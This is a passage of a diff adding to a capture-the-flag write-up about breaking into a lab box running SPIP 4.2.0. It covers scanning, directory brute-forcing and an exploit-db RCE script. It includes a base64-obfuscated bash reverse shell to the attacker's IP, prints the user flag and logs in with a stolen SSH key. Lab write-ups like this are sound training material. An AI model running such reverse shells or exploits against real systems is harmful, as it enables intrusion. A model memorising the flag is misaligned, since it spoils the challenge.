@@ -20,5 +20,35 @@ PORT   STATE SERVICE REASON         VERSION
 |_http-server-header: Apache/2.4.41 (Ubuntu)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
+We noticed that there is a web page on port 80 and ssh is open on port 22.
+Next step is to look around in the web page and use gobuster to search for more information.
+```bash
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u 10.10.246.38 -t50
+```
+I found /images and /spip. In the CTF "info" there was talk about having to use an RCE (Remote code execution) so i decided to lookup spip on msfconsole
+
+I searched for SPIP 4.2.0 but didn't find anything so I tried googling.
+and i found this https://www.exploit-db.com/exploits/51536
+
+I ran the code and started netcat on another terminal
+```bash
+python3 51536.py -u http://10.10.246.38/spip -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC42LjI1LjE1OS80NDQ0IDA+JjE= | base64 -d | bash"
+```
+Now we have gotten a reverse shell.
+To save the hassle of searching for the user.txt flag I wrote
+```bash
+find / -name "user.txt" 2>/dev/null
+```
+cat /home/think/user.txt
+fa229046d44eda6a3598c73ad96f4ca5
+
+Now we have to find a way to escalate our priviledges and get the root.flag.
+
+When browsing around the directories I found an readable .ssh file which included the private key so i was able to log in to get a more stable shell.
+I copied the key and chmod 600 and logged in with 
+```bash
+ssh -i id_rsa think@10.10.246.38
+```
+Then i decided to transfer the linpeass over to automate the search for possiblevulnerabilities. But that didn't work since I pretty much had no permission to do anything. I pressed the "hint" button and it said to check out the apparmor folder.
 
 
